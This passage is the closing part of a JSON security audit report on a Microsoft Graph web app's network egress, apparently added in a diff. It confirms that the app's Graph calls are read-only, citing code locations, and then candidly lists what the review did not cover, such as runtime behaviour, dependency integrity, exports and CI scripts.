+      "note": "Supported from the egress angle, which is all this lane checked. Every HTTP method used against Graph is a read: graphRequest defaults to GET (http.ts:84), and the only three non-GET call sites are POST /v1.0/$batch whose inner requests are all `method: 'GET'` (collectors.ts:252-259) and two POST /v1.0/directoryObjects/getByIds calls (onDemand.ts:32-34, 59-61) — both are Graph's read-by-id idioms, not mutations. No PATCH, PUT or DELETE appears anywhere outside a PowerShell string the plan tells the operator to run themselves (generate.ts:313-314, which is instructional text in a downloaded file, never executed by the app). The MSAL config requests GRAPH_SCOPES with no write scope and redirectUri derived from window.location.origin rather than a hardcoded third party (msal.ts:11-18). Scope-set review and the mutation lint are another lane's remit; I did not audit them."
+    }
+  ],
+  "coverage_gaps": [
+    "Bundle evidence comes from the pre-existing local dist/ (built 2026-08-30 08:35, gitignored), not from a build I ran — the ground rules are read-only. CI builds the deployed artifact with the same `vite build` via `npm run build:site` (deploy-pages.yml:36) and vite.config.ts has no mode-dependent branching, so the local artifact should be representative, but I could not fetch and diff what is actually served at getiamai.com/rollout/.",
+    "No runtime observation. I could not make network calls or run the app, so I could not watch the real request set a live session produces — only what the source and the built chunks can be shown to contain. A request constructed entirely at runtime from non-literal parts inside a dependency would not appear in any grep I ran.",
+    "node_modules was not audited. I checked only which host strings survived into the built chunks. @azure/msal-browser contributes login.chinacloudapi.cn, login.microsoftonline.de, login.microsoftonline.us and login.windows-ppe.net to the bundle as known-authority constants; I did not trace whether MSAL can ever be steered to one of them, nor whether msal-browser has its own telemetry path. If the token lane has not covered that, it is worth a look.",
+    "package-lock.json integrity and provenance were not checked. egress-01 and egress-02 both turn on supply-chain risk, and I asserted the shape of that risk (74 lockfile entries, one origin, no CSP) without verifying any package's integrity hashes or checking for install scripts.",
+    "Export contents beyond the clipboard were not exhaustively read. I confirmed the grounding bundle's redaction default and the diagnostics redaction, but did not read groundingBundle()'s redacted branch line by line to confirm it removes everything GROUNDING.redacted promises, nor did I audit the CSV, ICS, change-record or plan-file exports for names. That is the exports lane's ground.",
+    "The Web Worker's message surface was out of scope. I verified only that the worker chunk's sole outbound host is graph.microsoft.com; the postMessage contract, the token handed across it (runScan.ts:54), and the redacting wrapper at worker.ts:51 belong to other lanes.",
+    "I did not verify that the proposed CSP in egress-01 actually works with MSAL's silent-renewal iframe and the module/worker chunk loading — that needs a real browser and a real sign-in. Shipping it unverified could break authentication, which is why the fix says to test before deploying.",
+    "scripts/ (smoke.mjs, screens.mjs, layout-audit.mjs, ui-inventory.mjs) were not audited for network calls. They are build/CI tooling and never ship in the bundle, but they run in CI with repository access and are outside src/network.test.ts's walk."
+  ]
+}
